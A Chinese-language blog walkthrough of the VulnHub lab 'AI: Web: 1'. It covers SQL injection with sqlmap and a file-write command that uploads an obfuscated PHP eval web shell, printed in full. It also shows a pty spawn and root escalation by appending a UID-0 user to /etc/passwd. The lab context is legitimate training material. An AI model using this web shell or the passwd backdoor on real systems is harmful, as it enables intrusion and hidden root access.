        <content type="html"><![CDATA[<blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>额外设置了个跳板机，更接近现实<br><img src="/Rxi134_FILE/fc8a796b7c75ecb02200f2bbf5d32d55_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>扫下端口<br><img src="/Rxi134_FILE/7b75f0a6b36b30a6433a6ef27c967f90_MD5.jpeg"></p><p>访问网站页面，只有一行字<br><img src="/Rxi134_FILE/938b9d2811e2b344493418a36a37ae63_MD5.jpeg"></p><p>dirsearch扫目录只扫出个&#x2F;robots.txt</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User-agent: *Disallow: Disallow: /m3diNf0/Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问都是403，拿着 &#x2F;m3diNf0&#x2F; 和 &#x2F;se3reTdir777&#x2F; 继续扫</p><p>扫到  &#x2F;m3diNf0&#x2F;info.php，是一个phpinfo界面<br><img src="/Rxi134_FILE/e895abffb33d61ed10fb573347745eea_MD5.jpeg"><br>这时候想了一下会不会有XXE，但是libxml 2.9.4默认不解析外部实体<br><img src="/Rxi134_FILE/8b7947f4287429e7b16227d7f2fdf36f_MD5.jpeg"></p><p>扫  &#x2F;se3reTdir777&#x2F; 只有一个index.php<br><img src="/Rxi134_FILE/20223847dc332295b9557c3db09dfd12_MD5.jpeg"><br>这像是一个通过ID查询用户的系统<br><img src="/Rxi134_FILE/f450c481b54ad47b43c0c91ecfdd8de1_MD5.jpeg"></p><p>与数据库有交集，试试看有没有注入点<br><img src="/Rxi134_FILE/0cd126a50fdd43a0923edea5fbcc2f46_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">available databases [2]:[*] aiweb1[*] information_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Database: aiweb1[2 tables]+------------+| user       || systemUser |+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Table: user[3 entries]+----+----------+-----------+| id | lastName | firstName |+----+----------+-----------+| 1  | admin    | admin     || 2  | root     | root      || 3  | mysql    | mysql     |+----+----------+-----------++----+----------------------------------------------+-----------+| id | password                                     | userName  |+----+----------------------------------------------+-----------+| 1  | RmFrZVVzZXJQYXNzdzByZA==                     | t00r      || 2  | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ== | aiweb1pwn || 3  | TjB0VGhpczBuZUFsczA=                         | u3er      |+----+----------------------------------------------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64解码为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">FakeUserPassw0rdMyEvilPass_f908sdaf9_sadfasf0saN0tThis0neAls0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们这个用户有FILE权限<br><img src="/Rxi134_FILE/b3a8df81fe3d1eb20547bb74b882433e_MD5.jpeg"></p><p>要写马得获取绝对路径，一开始想sql shell执行SQL语句但好像没这个权限，不过前面的phpinfo界面可以直接看到绝对路径<br><img src="/Rxi134_FILE/45453dd1d872d71972c09c5a83632bbe_MD5.jpeg"></p><p>有权限写的位置只有 &#x2F;se3reTdir777&#x2F;uploads</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token string">"C:\Penetration<span class="token entity" title="\E">\E</span>xploitTools\Tools\Sqlmap\sqlmap.py"</span> <span class="token parameter variable">-r</span> <span class="token string">"C:\Users\ANONYM~1\AppData\Local\Temp<span class="token entity" title="\\">\\</span>192_168_50_137_80_20240802173240.req"</span> --file-write <span class="token string">"C:\Users\Anonymous\Desktop<span class="token entity" title="\202">\202</span>40802053947.php"</span> --file-dest <span class="token string">"/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/shell.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">GZ0lOZtq</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$H2qZ4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token operator">.</span><span class="token variable">$H2qZ4</span><span class="token operator">.</span><span class="token string double-quoted-string">"/*Z#��h*u@!h4g126854T*/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">GZ0lOZtq</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hh'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连接即可<br><img src="/Rxi134_FILE/29dd7c51e3681c1c77d3f4b07a7c9b86_MD5.jpeg"></p><p>在目录下又发现一个连接数据库的文件<br><img src="/Rxi134_FILE/b93740173bc90fc25e9f1ce48c97dbfa_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">数据库地址 localhost账密 aiweb1user:wGuDisZiTkLhuiH_z_zZQXXi数据库名称 aiweb1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹 shell 到跳板机上，我用的是frp反向代理<br><img src="/Rxi134_FILE/cb7046293b85207636403285a4e46edc_MD5.jpeg"></p><p><img src="/Rxi134_FILE/9aff13a14073a24ba411dd1cfeda2acb_MD5.jpeg"></p><p>起一个伪终端，方便回显</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/sh") '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以正常登录mysql<br><img src="/Rxi134_FILE/fde2063f2d5db55cec9646e9af77a0d8_MD5.jpeg"></p><p>进行一些信息搜集，上lineas<br><img src="/Rxi134_FILE/c5784084ac53b01ea3d8577239d190ab_MD5.jpeg"></p><p>本用户对 &#x2F;etc&#x2F;passwd 有写权限<br><img src="/Rxi134_FILE/bf11baf48105c308ba73a35040d28755_MD5.jpeg"><br>创建一个新用户x1nri，密码为123</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> x1nri <span class="token number">123</span><span class="token variable">$1</span><span class="token variable">$x1nri</span><span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么passwd条目为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">x1nri:$1$x1nri$RuLBMKXnN1w.xtGk5bIT21:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>追加重定向到末尾即可。记得转义$</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"x1nri:\<span class="token variable">$1</span>\<span class="token variable">$x1nri</span>\<span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/2dde81a003d363f0b9a2b03fca9564ce_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p><ul><li>更加深入了解了sqlmap</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
